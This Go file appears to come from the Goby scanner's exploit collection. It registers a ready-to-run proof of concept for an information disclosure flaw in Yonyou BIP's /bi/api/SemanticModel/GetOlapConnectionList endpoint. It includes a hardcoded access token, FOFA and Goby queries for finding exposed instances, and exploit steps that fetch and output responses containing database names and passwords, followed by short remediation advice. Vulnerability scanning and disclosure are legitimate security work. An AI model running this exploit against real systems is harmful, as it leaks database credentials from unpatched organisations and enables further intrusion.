package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou BIP data application service /bi/api/SemanticModel/GetOlapConnectionList Information Disclosure Vulnerability",
    "Description": "<p>Yonyou BIP is an enterprise-level application service system that integrates a variety of digital tools, aiming to provide enterprises with a full range of business management support such as finance, human resources, and supply chain management. Through cloud computing, artificial intelligence, big data and other technologies, the system helps enterprises achieve digital transformation, optimize business processes, and improve decision-making efficiency and operational capabilities.</p><p>Yonyou BIP has an information leakage vulnerability, in which an attacker constructs a special URL address to read sensitive information of the system.</p>",
    "Product": "yonyou-BIP",
    "Homepage": "https://www.yonyou.com/subject/sjfw",
    "DisclosureDate": "2024-10-23",
    "PostTime": "2024-11-06",
    "Author": "2974057526@qq.com",
    "FofaQuery": "body=\"/bi/portal/manifest.json\" && body=\"src=\\\"/bi/portal/static/js/\"",
    "GobyQuery": "body=\"/bi/portal/manifest.json\" && body=\"src=\\\"/bi/portal/static/js/\"",
    "Level": "1",
    "Impact": "<p>Yonyou BIP has an information leakage vulnerability, in which an attacker constructs a special URL address to read sensitive information of the system.</p>",
    "Recommendation": "<p>1. Delete or prohibit access to pages that leak sensitive information without affecting business or functions. </p><p>2.Fuzzy the relevant sensitive information on the server side.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/142848015"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "DatabaseName",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "valurl|lastbody|variable|{{{fixedhostinfo}}}/bi/api/SemanticModel/GetOlapConnectionList"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "DatabaseName",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "用友BIP /bi/api/SemanticModel/GetOlapConnectionList 信息泄露漏洞",
            "Product": "用友BIP",
            "Description": "<p>用友BIP是一款集成多种数字化工具的企业级应用服务系统，旨在为企业提供财务、人力资源、供应链管理等全方位的业务管理支持。该系统通过云计算、人工智能、大数据等技术，帮助企业实现数字化转型、优化业务流程，并提升决策效率和运营能力。<br></p><p>用友BIP存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>2、在服务器端对相关敏感信息进行模糊化处理。</p>",
            "Impact": "<p>用友BIP存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Yonyou BIP data application service /bi/api/SemanticModel/GetOlapConnectionList Information Disclosure Vulnerability",
            "Product": "yonyou-BIP",
            "Description": "<p>Yonyou BIP is an enterprise-level application service system that integrates a variety of digital tools, aiming to provide enterprises with a full range of business management support such as finance, human resources, and supply chain management. Through cloud computing, artificial intelligence, big data and other technologies, the system helps enterprises achieve digital transformation, optimize business processes, and improve decision-making efficiency and operational capabilities.<br></p><p>Yonyou BIP has an information leakage vulnerability, in which an attacker constructs a special URL address to read sensitive information of the system.<br></p>",
            "Recommendation": "<p>1. Delete or prohibit access to pages that leak sensitive information without affecting business or functions.&nbsp;</p><p>2.Fuzzy the relevant sensitive information on the server side.<br></p>",
            "Impact": "<p>Yonyou BIP has an information leakage vulnerability, in which an attacker constructs a special URL address to read sensitive information of the system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}